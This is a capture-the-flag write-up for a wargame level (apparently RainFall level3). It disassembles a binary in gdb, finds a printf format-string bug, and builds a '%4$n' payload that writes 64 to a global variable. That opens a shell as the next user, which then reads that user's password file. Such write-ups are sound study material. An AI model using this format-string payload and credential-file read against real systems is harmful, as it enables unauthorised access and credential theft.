# Level 3

## What we have

```bash 
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3

```

## Testing the program

```bash
$ ./level3
a
a
```

The program displays the input


## Learning more

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   %ebp
   0x0804851b <+1>:	mov    %esp,%ebp
   0x0804851d <+3>:	and    $0xfffffff0,%esp
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave  
   0x08048526 <+12>:	ret    
End of assembler dump.
```

The main calls a function 'v'. 

```bash
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave  
   0x08048519 <+117>:	ret    
End of assembler dump.
```

We see that the value at address 0x804988c is being put in the eax container. 
This value is then compared to 64 (Ox40 in hexadecimal).

```bash
0x080484da <+54>:	mov    0x804988c,%eax
0x080484df <+59>:	cmp    $0x40,%eax
```

Using gdb we can check the name of the variable at 0x804988c

```bash
(gdb) info variables
All defined variables:
[...]
0x0804988c  m
```

If it corresponds to 64 a call to system is made.

```bash
0x08048513 <+111>:	call   0x80483c0 <system@plt>
```

We can also see a call to printf() function wich is vulnerable to exploit.

```bash
0x080484d5 <+49>:	call   0x8048390 <printf@plt>
```

## Getting access to the shell

We are going to modify the value of the variable located at 0x804988c so that it equals 64, in order for the program to launch the system to ("bin/sh"). 


### Finding where is our input

First we need to know where our input is located on the stack so we can manipulate the addresses later on. 

```bash 
$ python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x"' > /tmp/exploit
$ cat /tmp/exploit | ./level3
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078
```

61616161 = "aaaa", in hexadecimal.
So our input is at the 4th slot (%4$x) in the stack. 

### Injecting m address

We want to write in the address 0x0804988c, so we pass it as little endian at the beginning of our payload. 

```bash
$ python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/exploit
$ cat /tmp/exploit | ./level3
? 200 b7fd1ac0 b7ff37d0 804988c
```

### Writing into the memory 

%n allows us to write, in an address, the number of characters that have been printed. 
```bash
printf("AAAAA%n", addr);
```
will write 5 (the number of chars before %n) to addr.


### Reaching the 64 value 

We want %n to write 64 in the address 0x804988c.

However we have already 4 characters for the address, so we only need 60 chars to reach the total. 

Final payload : 
```bash
$ python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
$ cat /tmp/exploit | ./level3
```

Explanation :
```plaintext
\x8c\x98\x04\x08 → adresse de m
"A" * 60 → padding
"%4$n" → écrit le total (64) à l'adresse au 4e emplacement dans la stack (notre adresse injectée)
```

```bash
python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
level3@RainFall:~$ cat /tmp/exploit - | ./level3
?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami 
level4
cat /home/user/level4/.pass
***************************************
```